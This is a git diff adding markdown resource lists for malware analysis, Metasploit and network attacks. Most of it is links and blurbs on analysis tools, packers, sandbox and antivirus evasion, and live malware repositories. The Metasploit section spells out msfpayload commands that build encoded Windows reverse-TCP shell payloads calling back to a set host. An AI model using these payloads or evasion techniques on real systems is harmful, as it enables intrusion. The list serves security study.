+* [Pybox](https://bitbucket.org/daniel_plohmann/pybox/)
+
+  * Auser-level framework for monitoring processes
+  * [Research paper on it](https://eldorado.tu-dortmund.de/bitstream/2003/27336/1/BookOfAbstracts_Spring5_2010.pdf)
+
+* [INetSim](http://www.inetsim.org/)
+
+  * INetSim is a software suite for simulating common internet services in a lab
+    environment, e.g. for analyzing the network behaviour of unknown malware
+    samples.
+
+* [Regshot](http://sourceforge.net/projects/regshot/)
+
+  * Regshot is an open-source (LGPL) registry compare utility that allows you to
+    quickly take a snapshot of your registry and then compare it with a second
+    one - done after doing system changes or installing a new software product.
+
+* [Mandiant ApateDNS](https://www.mandiant.com/resources/download/research-tool-mandiant-apatedns)
+
+  * Mandiant ApateDNS is a tool for controlling DNS responses though an easy to
+    use GUI. As a phony DNS server, Mandiant ApateDNS spoofs DNS responses to a
+    user-specified IP address by listening on UDP port 53 on the local machine.
+    Mandiant ApateDNS also automatically sets the local DNS to localhost. Upon
+    exiting the tool, it sets back the original local DNS settings.
+
+* [Malcom - Malware Communication Analyzer](https://github.com/tomchop/malcom)
+
+  * Malcom is a tool designed to analyze a system's network communication using
+    graphical representations of network traffic, and cross-reference them with
+    known malware sources. This comes handy when analyzing how certain malware
+    species try to communicate with the outside world.
+
+* [BasicHook](https://github.com/MalwareTech/BasicHook)
+
+  * x86 Inline hooking engine (using trampolines)
+
+* Claimsman
+
+  * Claimsman logs all file handle creation on Windows systems, and logs to both
+    a local file and centralized log management system.
+
+* [WinMerge](http://winmerge.org/)
+
+  * WinMerge is an Open Source differencing and merging tool for Windows.
+    WinMerge can compare both folders and files, presenting differences in a
+    visual text format that is easy to understand and handle.
+
+* [API Monitor](http://www.rohitab.com/apimonitor)
+
+  * API Monitor is a free software that lets you monitor and control API calls
+    made by applications and services. Its a powerful tool for seeing how
+    applications and services work or for tracking down problems that you have
+    in your own applications.
+
+* [SpyStudio](http://www.nektra.com/products/spystudio-api-monitor/)
+
+  * SpyStudio shows and interprets calls, displaying the results in a structured
+    way which is easy for any IT professional to understand. SpyStudio can show
+    registry keys and files that an application uses, COM objects and Windows
+    the application has created, and errors and exceptions.
+
+* [Microsoft Message Analyzer](http://www.microsoft.com/en-us/download/details.aspx?id=40308)
+
+  * Microsoft Message Analyzer is a new tool for capturing, displaying, and
+    analyzing protocol messaging traffic and other system messages. Message
+    Analyzer also enables you to import, aggregate, and analyze data from log
+    and trace files. It is the successor to Microsoft Network Monitor 3.4 and a
+    key component in the Protocol Engineering Framework (PEF) that was created
+    by Microsoft for the improvement of protocol design, development,
+    documentation, testing, and support. With Message Analyzer, you can choose
+    to capture data live or load archived message collections from multiple data
+    sources simultaneously.
+
+* [PyTrigger: A System to Trigger & Extract User-Activated Malware Behavior](http://cs.gmu.edu/~astavrou/research/PyTrigger_ARES2013.pdf)
+
+  * Abstract: PyTrigger analyzes the system trace using a combination of
+    multiple states and behavior differencing to accurately extract the malware
+    behavior and user triggered behavior from the complete system trace log. We
+    present the algorithms, architecture and evaluate the PyTrigger prototype
+    using 3994 real malware samples. Results and analysis are presented showing
+    PyTrigger extracts additional behavior in 21% of the samples.
+
+### Embedded
+
+* [Analyzing Malware for Embedded Devices: TheMoon Worm](http://w00tsec.blogspot.com/2014/02/analyzing-malware-for-embedded-devices.html)
+
+### Exploit Kits
+
+* [How exploit packs are concealed in a Flash object](https://securelist.com/analysis/publications/69727/how-exploit-packs-are-concealed-in-a-flash-object/?utm_content=buffer5de59&utm_medium=social&utm_source=twitter.com&utm_campaign=buffer)
+* [RIG Exploit Kit Writeup](https://www.trustwave.com/Resources/SpiderLabs-Blog/RIG-Exploit-Kit-%E2%80%93-Diving-Deeper-into-the-Infrastructure/)
+* [The Economics of Exploit Kits & E-Crime](http://www.irongeek.com/i.php?page=videos/bsidescolumbus2016/offense03-the-economics-of-exploit-kits-e-crime-adam-hogan)
+
+  * I will discuss how the market for exploit kits has been changing, in
+    techniques, marketing and prices. I argue that the competitiveness between
+    exploit kits shows a maturing market, but will leverage economic theory to
+    demonstrate the limits to which that market will continue to mature. This
+    should allow us to understand how exploit kits affect (and are affected by)
+    the rest of the greater market for hacker services, from malware (as an
+    input) to nation-state level attacks (e.g. trickle down from Hacking Team).
+    I hope to provide a better understanding of how exploit kits work and how
+    their sold as well as how this market can teach us about the rational choice
+    to engage in criminal activity and how we might dissuade them.
+
+### Hashing
+
+* [binwally](https://github.com/bmaia/binwally)
+* [Binary and Directory tree comparison tool using the Fuzzy Hashing concept (ssdeep)](http://w00tsec.blogspot.com/2013/12/binwally-directory-tree-diff-tool-using.html)
+* [Ssdeep](http://ssdeep.sourceforge.net/)
+  * static malware comparison tool - ssdeep is a program for computing context
+    triggered piecewise hashes (CTPH). Also called fuzzy hashes, CTPH can match
+    inputs that have homologies. Such inputs have sequences of identical bytes
+    in the same order, although bytes in between these sequences may be
+    different in both content and length.
+
+### iOS
+
+### General Analysis
+
+* [PortEX: Robust static anaylsis of Portable Executable Malware](https://evilzone.org/reverse-engineering/%28pdf%29-robust-static-analysis-of-portable-executable-malware/)
+
+### General
+
+* [Malvertising: Under The Hood by Chris Boyd - BSides Manchester2017](https://www.youtube.com/watch?v=VESvOsr91_M&index=1&list=PLcgqQkap1lNrOBNCXqpPqpPAqckxv0XhP)
+
+### Hunting Down Malware
+
+* [License to Kill: Malware Hunting with the Sysinternals Tools](https://channel9.msdn.com/Events/TechEd/NorthAmerica/2013/ATC-B308)
+
+### Mac
+
+* [Writing Bad @$$ Malware for OS X - Patrick Wardle](https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf)
+* [Offensive Malware Analysis: Dissecting OSX FruitFly - Patrick Wardle - DEF CON 25](https://www.youtube.com/watch?v=q7VZtCUphgg)
+
+  * FruitFly, the first OS X/macOS malware of 2017, is a rather intriguing
+    specimen. Selectively targeting biomedical research institutions, it is
+    thought to have flown under the radar for many years. In this talk, we'll
+    focus on the 'B' variant of FruitFly that even now, is only detected by a
+    handful of security products. We'll begin by analyzing the malware's
+    dropper, an obfuscated perl script. As this language is rather archaic and
+    uncommon in malware droppers, we'll discuss some debugging techniques and
+    fully deconstruct the script.
+
+* [I got 99 Problems, but Little Snitch ain’t one! - Defcon2016](https://speakerdeck.com/patrickwardle/defcon-2016-i-got-99-problems-but-little-snitch-aint-one)
+
+### Malware Repos
+
+* [The Zoo](https://github.com/ytisf/theZoo)
+
+  * A repository of LIVE malwares for your own joy and pleasure
+
+* [Mobile Malware dumps - Contagio](http://contagiominidump.blogspot.ca/)
+* [Ragpicker - Malware Crawler](https://code.google.com/p/malware-crawler/)
+
+  * Ragpicker is a Plugin based malware crawler with pre-analysis and reporting
+    functionalities. Use this tool if you are testing antivirus products,
+    collecting malware for another analyzer/zoo. Contagio/Contagio mobile
+
+* [Equation Group Malware Samples - ContagioDump](http://contagiodump.blogspot.com/2015/02/equation-samples-from-kaspersky-report.html)
+* [Objective-See Mac Malware Repo](https://objective-see.com/malware.html)
+
+### Obfuscation
+
+* [Data Obfuscation: Now you see me... Now you don't...](http://malwageddon.blogspot.com/2015/03/data-obfuscation-now-you-see-me-now-you.html)
+
+  * This blog post shows how malware authors use Adobe Flash files to hide their
+    creations' 'sensitive' data. I'll be using 2 recent Neutrino EK and 1
+    FlashPack malvertising samples to demonstrate it. In the case of Neutrino EK
+    our goal will be extraction and decryption of its configuration file and in
+    the malvertising case we'll be after the initial payload URL + exploit
+    shellcode.
+
+### Office Documents
+
+* [Loffice - Analyzing malicious documents using WinDbg](https://thembits.blogspot.com/2016/06/loffice-analyzing-malicious-documents.html)
+
+### Online Checkers
+
+* [VirusTotal Mining](http://blog.9bplus.com/wp-content/uploads/2014/08/VirusTotal-Mining.pdf)
+* [Malice](https://github.com/maliceio/malice)
+
+  * Malice's mission is to be a free open source version of VirusTotal that
+    anyone can use at any scale from an independent researcher to a fortune 500
+    company.
+
+* [Wepawet](https://wepawet.iseclab.org/)
+
+  * Wepawet is a free service, for non-commercial organizations, to detect and
+    analyze web-based threats. It currently handles Flash, JavaScript, and PDF
+    files
+
+* [IRMA - Incident Response & Malware Analysis](http://irma.quarkslab.com/index.html)
+
+  * IRMA intends to be an open-source platform designed to help identifying and
+    analyzing malicious files. However, today's defense is not only about
+    learning about a file, but it is also getting a fine overview of the
+    incident you dealt with: where / when a malicious file has been seen, who
+    submitted a hash, where a hash has been noticed, which anti-virus detects
+    it, ... An important value with IRMA comes from you keep control over where
+    goes / who gets your data. Once you install IRMA on your network, your data
+    stays on your network. Each submitted files is analyzed in various ways. For
+    now, we focus our efforts on multiple anti-virus engines, but we are working
+    on other "probes" (feel free to submit your own).
+
+### (Un)Packers/Encoders
+
+* --> See 'Packers' section under 'Writeups' in RE
+* [Corkami - Packers](https://corkami.googlecode.com/files/packers.pdf)
+
+  * Beautiful.
+
+* [Stack Overflow RE -What are the different types of packers?](https://reverseengineering.stackexchange.com/questions/1779/what-are-the-different-types-of-packers)
+* [packer-breaker](http://www.sysreveal.com/category/packerbreaker/)
+
+  * Unpacker for a variety of packing tools.
+
+* [One packer to rule them all: Empirical identification, comparison and circumvention of current Antivirus detection techniques](http://www.arneswinnen.net/wp-content/uploads/2014/08/)
+* [Deep dive into a custom malware packer](http://resources.infosecinstitute.com/deep-dive-into-a-custom-malware-packer/)
+* [Manually unpacking a Morphine-packed DLL with OllyDbg](http://www.joestewart.org/morphine-dll/)
+* [Paper on Manual unpacking of UPX packed executable using Ollydbg and Importrec](http://www.iosrjournals.org/iosr-jce/papers/Vol16-issue1/Version-1/L016117177.pdf)
+* [A study of the packer problem and its solutions](https://link.springer.com/chapter/10.1007/978-3-540-87403-4_6)
+* [Packer Analysis Report - Debugging and unpacking the NsPack 3.4 and 3.7 packer](https://www.sans.org/reading-room/whitepapers/malicious/packer-analysis-report-debugging-unpacking-nspack-34-37-packer-33428)
+
+  * WP-us-14-Mesbahi-Swinnen-One-packer-to-rule-them-all-Empirical-identification-comparison-and-circumvention-of-current-Antivirus-detection-techniques.pdf)
+
+* [Duping the machine: malware strategies, post Sandbox detection](https://www.virusbtn.com/pdf/conference_slides/2014/Wyke-VB2014.pdf)
+* [Locreate: An Anagram for Relocate ](http://uninformed.org/?v=all&a=30&t=sumry)
+
+  * This paper presents a proof of concept executable packer that does not use
+    any custom code to unpack binaries at execution time. This is different from
+    typical packers which generally rely on packed executables containing code
+    that is used to perform the inverse of the packing operation at runtime.
+    Instead of depending on custom code, the technique described in this paper
+    uses documented behavior of the dynamic loader as a mechanism for performing
+    the unpacking operation. This difference can make binaries packed using this
+    technique more difficult to signature and analyze, but only when presented
+    to an untrained eye. The description of this technique is meant to be an
+    example of a fun thought exercise and not as some sort of revolutionary
+    packer. In fact, it's been used in the virus world many years prior to this
+    paper.
+
+* [Implementing a Custom X86 Encoder](http://uninformed.org/?v=all&a=25&t=sumry)
+
+  * This paper describes the process of implementing a custom encoder for the
+    x86 architecture. To help set the stage, the McAfee Subscription Manager
+    ActiveX control vulnerability, which was discovered by eEye, will be used as
+    an example of a vulnerability that requires the implementation of a custom
+    encoder. In particular, this vulnerability does not permit the use of
+    uppercase characters. To help make things more interesting, the encoder
+    described in this paper will also avoid all characters above 0x7f. This will
+    make the encoder both UTF-8 safe and tolower safe.
+
+* [Using dual-mappings to evade automated unpackers ](http://uninformed.org/?v=all&a=44&t=sumry)
+
+  * Automated unpackers such as Renovo, Saffron, and Pandora's Bochs attempt to
+    dynamically unpack executables by detecting the execution of code from
+    regions of virtual memory that have been written to. While this is an
+    elegant method of detecting dynamic code execution, it is possible to evade
+    these unpackers by dual-mapping physical pages to two distinct virtual
+    address regions where one region is used as an editable mapping and the
+    second region is used as an executable mapping. In this way, the editable
+    mapping is written to during the unpacking process and the executable
+    mapping is used to execute the unpacked code dynamically. This effectively
+    evades automated unpackers which rely on detecting the execution of code
+    from virtual addresses that have been written to.
+
+* [Unpacking with OllyBonE](http://www.joestewart.org/ollybone/tutorial.html)
+
+  * This is a brief tutorial giving the basic steps to unpack code using the
+    OllyBonE plugin.
+
+### Persistence
+
+* [Poweliks: the persistent malware without a file](https://blog.gdatasoftware.com/blog/article/poweliks-the-persistent-malware-without-a-file.html)
+* [Temporal Persistence with bitsadmin and schtasks](http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html)
+* [Many ways of malware persistence (that you were always afraid to ask) ](http://jumpespjump.blogspot.com/2015/05/many-ways-of-malware-persistence-that.html)
+
+### Static Analysis Tools
+
+* [Pyew](https://code.google.com/p/pyew/)
+
+  * Pyew is a (command line) python tool to analyse malware. It does have
+    support for hexadecimal viewing, disassembly (Intel 16, 32 and 64 bits), PE
+    and ELF file formats (it performs code analysis and let you write scripts
+    using an API to perform many types of analysis), follows direct call/jmp
+    instructions in the interactive command line, displays function names and
+    string data references; supports OLE2 format, PDF format and more. It also
+    supports plugins to add more features to the tool.
+
+* [Manalyze - static analyzer for PE files](https://github.com/JusticeRage/Manalyze)
+
+  * Manalyze was written in C++ for Windows and Linux and is released under the
+    terms of the GPLv3 license. It is a robust parser for PE files with a
+    flexible plugin architecture which allows users to statically analyze files
+    in-depth.
+
+* [yalda - Gita Ziabari](https://github.com/fideliscyber/yalda)
+
+  * The tool is designed to analyze the given files and extract malicious data
+    out of the files.
+
+* [Presentation](https://www.youtube.com/watch?v=OPRqgEZXWOE)
+* [Dependency Walker](http://www.dependencywalker.com/)
+
+  * Dependency Walker is a free utility that scans any 32-bit or 64-bit Windows
+    module (exe, dll, ocx, sys, etc.) and builds a hierarchical tree diagram of
+    all dependent modules. For each module found, it lists all the functions
+    that are exported by that module, and which of those functions are actually
+    being called by other modules. Another view displays the minimum set of
+    required files, along with detailed information about each file including a
+    full path to the file, base address, version numbers, machine type, debug
+    information, and more.
+
+### Techniques
+
+* [BG00 Injection on Steroids Code less Code Injections and 0 Day Techniques Paul Schofield Udi Yavo](https://www.youtube.com/watch?v=0BAaAM2wD4s)
+* [[Slides] Injection on Steroids: Code-less Code Injections and 0-Day Techniques](https://breakingmalware.com/injection-techniques/code-less-code-injections-and-0-day-techniques/)
+* [Amoco - Static binary analysis tool](https://github.com/bdcht/amoco)
+
+  * Amoco is a python package dedicated to the (static) analysis of binaries.
+
+* [Code Injection Techniques -2013](http://resources.infosecinstitute.com/code-injection-techniques/)
+
+### Virtual Machines
+
+* [antivmdetection](https://github.com/nsmfoo/antivmdetection)
+
+  * Script to create templates to use with VirtualBox to make vm detection
+    harder.
+
+* [Breaking the Sandbox - Sudeep Singh](http://www.exploit-db.com/wp-content/themes/exploit/docs/34591.pdf)
+
+  * Abstract: In this paper, I would like to discuss various existing and
+    interesting techniques which are used to evade the detection of a virus in
+    Sandbox. We will also look at ways a sandbox can be hardened to prevent such
+    evasion.
+
+* [On the Cutting Edge: Thwarting Virtual Machine Detection](http://handlers.sans.org/tliston/ThwartingVMDetection_Liston_Skoudis.pdf)
+* [Paranoid Fish](https://github.com/a0rtega/pafish)
+
+  * Pafish is a demo tool that performs some anti(debugger/VM/sandbox) tricks.
+    Most of them are often used by malware to avoid debugging and dynamic
+    analysis. The project is open source, you can read the code of all
+    anti-analysis checks. You can also download the compiled executable (or
+    compile it by yourself) and reverse engineer it, which is quite recommended.
+
+* [rdtsc x86 instruction to detect virtual machines](http://blog.badtrace.com/post/rdtsc-x86-instruction-to-detect-vms/)
+* [Win64/Vabushky - The Great Code Heist](http://www.malwaretech.com/2013/09/win64vabushky-great-code-heist.html)
+* [Scientific but Not Academical Overview of Malware Anti-Debugging, Anti-Disassembly and Anti- VM Technologies](http://research.dissect.pe/docs/blackhat2012-paper.pdf)
+
+  * This talk catalogs the common evasion techniques malware authors employ,
+    applying over 50 different static detections, combined with a few dynamic
+    ones for completeness. We validate our catalog by running these detections
+    against a database of 4 million samples (the system is constantly running
+    and the numbers will be updated for the presentation), enabling us to
+    present an analysis on the real state of evasion techniques in use by
+    malware today. The resulting data will help security companies and
+    researchers around the world to focus their attention on making their tools
+    and processes more efficient to rapidly avoid the malware authors'
+    countermeasures.
+
+* [Process Hollowing - Dridex](http://countuponsecurity.com/2015/12/07/malware-analysis-dridex-process-hollowing/)
+* [SubVirt: Implementing malware with virtual machines](http://web.eecs.umich.edu/virtual/papers/king06.pdf)
+
+  * We evaluate a new type of malicious software that gains qualitatively more
+    control over a system. This new type of malware, which we call a
+    virtual-machine based rootkit (VMBR), installs a virtual-machine monitor
+    underneath an existing operating system and hoists the original operating
+    system into a virtual machine. Virtual-machine based rootkits are hard to
+    detect and remove because their state cannot be accessed by soft- ware
+    running in the target system. Further, VMBRs support general-purpose
+    malicious services by allowing such services to run in a separate operating
+    system that is protected from the target system. We evaluate this new threat
+    by implementing two proof-of-concept VMBRs. We use our proof-of-concept
+    VMBRs to subvert Windows XP and Linux target systems, and we implement four
+    example malicious services using the VMBR platform. Last, we use what we
+    learn from our proof-of-concept VMBRs to explore ways to defend against this
+    new threat. We discuss possible ways to detect and prevent VMBRs, and we
+    implement a defense strategy suitable for protecting systems against this
+    threat.
+
+* [Modeling Zero Day Malware Spread](https://lqdc.github.io/modeling-zero-day-malware-spread.html)
+
+  * Duping the Machine: malware strategies, post sandbox detection
+
+* [Slide deck presentation](https://www.virusbtn.com/pdf/conference_slides/2014/Wyke-VB2014.pdf)
+* [Win32_ComputerSystem class](<https://msdn.microsoft.com/en-us/library/aa394102(v=vs.85).aspx>)
+* [Win32_BIOS class](<https://msdn.microsoft.com/en-us/library/aa394077(v=vs.85).aspx>)
+
+### Windows
+
+* [Trojan.Foxy writeup](http://www.cyberesi.com/2011/08/31/trojan-foxy/)
+
+  * Today I will write about a sample that I will refer to as Trojan.Foxy.
+    Trojan.Foxy requests and parses .JPG images that contain encoded
+    instructions. The encoding algorithm used by this Trojan is loosely based
+    off of the Vigenère cipher; however there is a deviation in how the cipher
+    is applied.
+
+* [Uroburos](https://blog.gdatasoftware.com/blog/article/uroburos-highly-complex-espionage-software-with-russian-roots.html)
+
+  * `https://www.gdata.de/rdk/dl-en-rp-Uroburos`
+
+* [Thousand ways to backdoor a Windows domain (forest)](http://jumpespjump.blogspot.com/2015/03/thousand-ways-to-backdoor-windows.html)
+* [COM Object hijacking: the discreet way of persistence](https://blog.gdatasoftware.com/blog/article/com-object-hijacking-the-discreet-way-of-persistence.html)
+* [Nesting doll: unwrapping Vawtrak](https://www.virusbtn.com/virusbulletin/archive/2015/01/vb201501-Vawtrak)
+* [Rotten Tomatoes campaign by Sophos](http://www.sophos.com/en-us/medialibrary/PDFs/technical%20papers/sophos-rotten-tomato-campaign.pdf)
+* [Full details on CVE-2015-0096 and the failed MS10-046 Stuxnet fix](http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Full-details-on-CVE-2015-0096-and-the-failed-MS10-046-Stuxnet/ba-p/6718459#.VP9cTDTF-PU)
+
+#### Misc
+
+* [The Backdoor Factory (BDF)](https://github.com/secretsquirrel/the-backdoor-factory)
+
+  * For security professionals and researchers only. The goal of BDF is to patch
+    executable binaries with user desired shellcode and continue normal
+    execution of the prepatched state.
+
+* [Derbycon Presentation](https://www.youtube.com/watch?v=LjUN9MACaTs)
+* [How to Bypass Anti-Virus to Run Mimikatz - **Spoiler, AV still suck, changing strings is helpful**](http://www.blackhillsinfosec.com/?p=5555)
+* [peCloak.py - An Experiment in AV Evasion](http://www.securitysift.com/pecloak-py-an-experiment-in-av-evasion/)
+* [Making FinFisher Undetectable](https://lqdc.github.io/making-finfisher-undetectable.html)
+* [Bypass AV through several basic/effective techniques](http://packetstorm.foofus.com/papers/virus/BypassAVDynamics.pdf)
+* [stupid_malware](https://github.com/andrew-morris/stupid_malware)
+
+  * Python malware for pentesters that bypasses most antivirus (signature and
+    heuristics) and IPS using sheer stupidity
+
+* [InfectPE](https://github.com/secrary/InfectPE)
+
+  * Using this tool you can inject x-code/shellcode into PE file. InjectPE works
+    only with 32-bit executable files.
+
+* [Frida](http://www.frida.re/docs/home/)
+
+  * Inject JS into native apps
+
+* [Maltrail](https://github.com/stamparm/maltrail)
+
+  * Maltrail is a malicious traffic detection system, utilizing publicly
+    available (black)lists containing malicious and/or generally suspicious
+    trails, along with static trails compiled from various AV reports and custom
+    user defined lists, where trail can be anything from domain name (e.g.
+    zvpprsensinaix.com for Banjori malware), URL (e.g.
+    http://109.162.38.120/harsh02.exe for known malicious executable), IP
+    address (e.g. 185.130.5.231 for known attacker) or HTTP User-Agent header
+    value (e.g. sqlmap for automatic SQL injection and database takeover tool).
+    Also, it uses (optional) advanced heuristic mechanisms that can help in
+    discovery of unknown threats (e.g. new malware).
+
+* [PowerLoaderEX](https://github.com/BreakingMalware/PowerLoaderEx)
+
+* [Software Distribution Malware Infection Vector](http://dl.packetstormsecurity.net/papers/general/Software.Distribution.Malware.Infection.Vector.pdf)
+
+  * In this paper we present an efficient mechanism as well as the corresponding
+    reference implementation for on- the-fly infecting of executable code with
+    malicious soft- ware. Our algorithm deploys virus infection routines and
+    network redirection attacks, without requiring to modify the application
+    itself. This allows to even infect executa- bles with a embedded signature
+    when the signature is not automatically verified before execution. We
+    briefly dis- cuss also countermeasures such as secure channels, code
+    authentication as well as trusted virtualization that en- ables the
+    isolation of untrusted downloads from other ap- plication running in trusted
+    domains or compartments.
+
+* [Statistical Structures: Fingerprinting Malware for Classification and Analysis - Daniel Bilar](https://www.blackhat.com/presentations/bh-usa-06/BH-US-06-Bilar.pdf)
+* [Malware Guard Extension: Using SGX to Conceal Cache Attacks](https://arxiv.org/abs/1702.08719)
+
+  * In this paper, we demonstrate fine-grained software-based side-channel
+    attacks from a malicious SGX enclave targeting co-located enclaves. Our
+    attack is the first malware running on real SGX hardware, abusing SGX
+    protection features to conceal itself. Furthermore, we demonstrate our
+    attack both in a native environment and across multiple Docker containers.
+    We perform a Prime+Probe cache side-channel attack on a co-located SGX
+    enclave running an up-to-date RSA implementation that uses a constant-time
+    multiplication primitive. The attack works although in SGX enclaves there
+    are no timers, no large pages, no physical addresses, and no shared memory.
+    In a semi-synchronous attack, we extract 96% of an RSA private key from a
+    single trace. We extract the full RSA private key in an automated attack
+    from 11 traces within 5 minutes.
diff --git a/source/Metasploit.md b/source/Metasploit.md
new file mode 100644
index 0000000..ceb67d4
--- /dev/null
+++ b/source/Metasploit.md
@@ -0,0 +1,87 @@
+# Metasploit Framework
+
+### General
+
+* [What is Metasploit?](https://www.youtube.com/watch?v=TCPyoWHy4eA)
+
+* [Metasploit - github.io](https://metasploit.github.io/Metasploit.md)
+
+  * It is the official “reference” page for the metasploit framework
+
+* [Facts and Myths about AV Evasion with the Metasploit Framework](http://schierlm.users.sourceforge.net/avevasion.html)
+
+* [MSF/Meterpreter cmd reference](http://hacking-class.blogspot.com/2011/08/metasploit-cheat-sheet-metasploit.html)
+
+* [Empire - Powershell Post-Exploitation Agent](http://www.powershellempire.com/)
+
+  * Empire is a pure PowerShell post-exploitation agent built on
+    cryptologically-secure communications and a flexible architecture. Empire
+    implements the ability to run PowerShell agents without needing
+    powershell.exe, rapidly deployable post-exploitation modules ranging from
+    key loggers to Mimikatz, and adaptable communications to evade network
+    detection, all wrapped up in a usability-focused framework.
+
+* http://it-ovid.blogspot.com/2012/02/metasploit-and-meterpreter.html
+
+### Metasploit Framework - Payload Encoding
+
+* List all available payloads and search for windows reverse tcp
+
+  * `shellsmsfpayload -l | grep windows | grep shell | grep reverse | tcp`
+
+* List available encoders
+
+  * `msfencode -l`
+
+* Reverse self-contained (not staged) command shell: 341 bytes
+
+  * `msfpayload windows/shell_reverse_tcp LHOST=192.168.6.1 R | msfencode -e
+    x86/shikata_ga_nai -b '\x00\x0a\x0b\x0d\x90' -t c`
+
+* Windows Command Shell, reverse Ordinal TCP Stager (Np NX or Win7)
+
+  * Use msf multi/handler to listen and upload remainder of the shellcode (stage
+    2)
+  * `msfpayload windows/shell/reverse_ord_tcp LHOST=192.168.6.1 R | msfencode -e
+    x86/shikata_ga_nai -b '\x00\x0a\x0b\x0d\x90' -t c`
+
+* Generic Syntax
+
+  * `msfpayload <payload> <options> <output>| ./msfencode -e <encoder> -b <bad
+    bytes> -t <output format>`
+
+### Contributing to Metasploit
+
+* [Writing an Exploit](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-exploit)
+* [Writing an Exploit for Metasploit by Corelan](https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/Metasploit.md)
+* [Writing an Auxiliary module](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-auxiliary-module)
+* [Writing a Post-Exploitation module](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-a-post-module)
+* [Style tips for writing a Metasploit module](https://github.com/rapid7/metasploit-framework/wiki/Style-Tips)
+* [Metasploit Framework Module Github](https://github.com/rapid7/metasploit-framework/tree/master/modules)
+
+  * Easiest way of seeing the most current listing of any modules.
+  * All are Github pages for the Metasploit project
+
+* [Metasploit Framework Wiki](https://github.com/rapid7/metasploit-framework/wiki)
+* [Auxiliary Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary)
+* [Auxiliary Module Fuzzers](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/fuzzers)
+* [Denial-of-Service Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/dos)
+* [Auxiliary Gather Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/gather)
+* [Auxiliary Scanner Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/scanner)
+* [Server Auxiliary Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/server)
+* [Auxiliary Spoofing Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/spoof)
+* [Auxiliary VOIP Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/voip)
+* [Encoder Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/encoders)
+* [Payloads - Singles](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/singles)
+* [Payloads - Singles - Windows](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/singles/windows)
+* [Payloads - Singles - Linux x86](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/singles/linux/x86)
+* [Payloads - Stagers](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/stagers)
+* [Payloads - Stagers - Windows](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/stagers/windows)
+* [Payloads - Stagers - Linux x86](https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads/stagers/linux/x86)
+* [Exploits](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits)
+* [Exploits - Windows](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/windows)
+* [Exploits - Linux](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux)
+* [Exploits - Multi-Platform](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/multi)
+* [Post-Exploitation Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/post)
+* [Post-Exploitation Windows Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/post/windows)
+* [Post-Exploitation Linux Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/post/linux)
diff --git a/source/Network-Attacks-Defenses.md b/source/Network-Attacks-Defenses.md
new file mode 100644
index 0000000..7f0056f
--- /dev/null
+++ b/source/Network-Attacks-Defenses.md
@@ -0,0 +1,1317 @@
+# Network Attacks & Defenses
+
+### ToC
+
+* [General](#general)
+* [Attacking Windows Networks](#attackw)
+
+  * [Lateral Movement](#lateral)
+  * [Active Directory](#AD)
+  * [Sharepoint](#sharepoint)
+
+* [General tools](#generaltools)
+* [DNS](#dns)
+* [D/DOS](#ddos)
+* [Email](#email)
+* [Frameworks](#frameworks)
+* [IDS/IPS Evasion](#evasion)
+* [IPMI](#ipmi)
+* [IPv6 Related](#ipv6)
+* [LDAP](#ldap)
+* [Man-in-the-Middle Tools](#mitm)
+* [Netbios](#netbios)
+* [Network Host/Service Discovery](#host)
+* [NFS](#nfs)
+* [Pivoting](#pivot)
+* [Proxies](#proxy)
+* [Software Defined Networking(SDN)](#sdn)
+* [SSH](#ssh)
+* [SQL](#sql)
+* [SNMP](#snmp)
+* [SIP/VOIP](#sip)
+* [SSL/TLS](#ssl)
+* [STP](#stp)
+* [MISC](#misc)
+* [Talks/Videos](#videos)
+* [UPNP](#upnp)
+* [Web](#web)
+* [Writeups](#writeups)
+* [Other](#other)
+
+##### To be sorted
+
+* http://www.pentest-standard.org/index.php/Intelligence_Gathering
+* [CVE-2017-7494](https://github.com/joxeankoret/CVE-2017-7494)
+
+  * Remote root exploit for the SAMBA CVE-2017-7494 vulnerability
+
+* [10 Places to Stick Your UNC Path - NetSPI](https://blog.netspi.com/10-places-to-stick-your-unc-path/)
+* [HackerOne H1-212 Capture the Flag Solution - Corben Douglas](http://www.sxcurity.pro/H1-212%20CTF%20Solution.pdf)
+
+### General
+
+* [Fundamentals That Time Forgot - Jup1t3r - BSides SLC](https://www.youtube.com/watch?v=PQvUWImljOw)
+* [pynessus](https://github.com/rmusser01/pynessus)
+
+  * Python Parser for Nessus Output
+
+* [Examples](http://www.hackwhackandsmack.com/?p=422)
+* [TCPDump Primer](http://danielmiessler.com/study/tcpdump/)
+* [IANA Complete list of assigned ports](http://www.vulnerabilityassessment.co.uk/port-numbers.txt)
+* [which-cloud](https://github.com/bcoe/which-cloud)
+
+  * Given an ip address, return which cloud provider it belongs to (AWS, GCE,
+    etc)
+
+- [RFC 2827 - Network Ingress Filtering: Defeating Denial of Service Attacks which employ IP Source Address Spoofing](https://tools.ietf.org/html/rfc2827)
